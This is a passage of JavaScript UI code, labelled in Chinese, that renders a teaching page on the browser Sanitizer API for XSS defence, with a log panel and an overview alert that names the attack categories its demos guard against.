        h('div', { class: 'fs-sm text-secondary' }, '陷阱与最佳实践详情：'),
        h('pre', { class: 'code-block', style: { maxHeight: '500px', overflow: 'auto' } },
          h('code', {}, s.pitfallsInfo || '（点击按钮查看陷阱与最佳实践完整说明）')),
      ],
    });
    this.registerChild(card);
    return card.render();
  }

  // ===================== 日志面板 =====================

  _renderLogPanel() {
    const s = this.state;
    if (!s.logs || s.logs.length === 0) return null;
    return h(Card, { title: '运行日志' },
      h('div', { class: 'log-list' },
        ...s.logs.map((log) =>
          h('div', { class: `log-item log-${log.type}` },
            h('span', { class: 'log-time' }, log.time),
            h('span', { class: 'log-content' }, log.content),
          ),
        ),
      ),
    );
  }

  // ===================== 渲染入口 =====================

  renderPage() {
    const s = this.state;
    return [
      h('h2', { class: 'section-title' }, 'Sanitizer API HTML 净化完整实验室'),

      h(Alert, {
        type: 'info',
        message: 'Sanitizer API —— 浏览器原生 HTML 净化深度实验室',
        description: '演示 W3C Sanitizer API（浏览器原生 HTML 净化，将 XSS 防御下沉到浏览器内核，替代 DOMPurify）：Sanitizer 构造与配置（new Sanitizer(config) / allowElements-blockElements-dropElements 三组元素规则 / allowAttributes-dropAttributes 两 组属性规则 / allowComments / allowCustomElements / getConfiguration 返回快照不可变）、sanitizeFor 静态方法（Sanitizer.sanitizeFor(tag, html) 解析+净化+包装返回 Element / 用 default sanitize mode / 与 setHTML 等价于 createElement + setHTML + appendChild）、setHTML 实例方法（element.setHTML(html, { sanitizer }) 替代 innerHTML / 浏览器内部解析+净化+赋值一步到位 / 1 次解析无双重开销 / 天然 TrustedHTML sink 与 CSP require-trusted-types-for 协同）、元素规则优先级（dropElements > allowElements > blockElements / dropElements 始终生效 / allowElements 与 blockElements 不能同时包含同元素 / blockElements 保留子节点提升 / dropElements 删除元素及子节点）、属性规则（dropAttributes > allowAttributes / 通配符 * 匹配所有元素 / on* 匹配事件属性 / 命名空间属性 xlink:href/xml:lang/xml:base 默认移除 / 默认配置移除 on*/style/data-*）、实战用户评论净化（9 条评论含 7 条攻击向量：script 注入 / img onerror / javascript: URL / iframe / svg onload / style @import / mutation XSS / 严格白名单 p-b-i-a-blockquote-code-img + dropElements script-iframe-style-svg-form）、实战与陷阱（Trusted Types 集成 createHTML policy 双重防线 / DevTools Console 调试 / DOMPurify 对比 0KB vs 21KB 1 次解析 vs 2 次解析 Chrome 实验 vs 全平台稳定 / Polyfill 适配器基于 DOMPurify / sanitizeFor vs setHTML 选择 / CSP 协同 / 性能对比 / 12 条常见陷阱 + 10 条最佳实践）。Sanitizer API 截至 2025 仅 Chromium 系实验性支持（Chrome 105+ 实验性 flag / Firefox Safari 未实现 / jsdom 无），所有按钮点击提供 DOMParser + 白名单兼容降级演示（仅教学，非生产可用 Sanitizer）。',
      }),

      s.capsSummary !== '' ? h(Alert, { type: 'info', message: s.capsSummary }) : null,

      h('div', { class: 'feature-grid' },
        this._renderCard1(),
        this._renderCard2(),
        this._renderCard3(),
        this._renderCard4(),
        this._renderCard5(),
        this._renderCard6(),
        this._renderCard7(),
        this._renderCard8(),
      ),

      this._renderLogPanel(),
    ];
  }
}
